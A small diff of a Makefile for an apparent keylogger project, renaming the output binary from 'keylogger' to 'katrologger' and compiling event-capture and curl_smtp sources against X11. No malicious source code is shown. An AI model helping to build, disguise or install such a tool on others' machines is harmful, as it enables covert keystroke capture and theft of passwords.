@@ -1,5 +1,5 @@
 BIN=/usr/bin/
-EXEC=keylogger
+EXEC=katrologger
 
 all:
 	gcc src/event.c src/main.c src/usage.c src/curl_smtp.c src/status.c -o $(EXEC) -lX11 -w
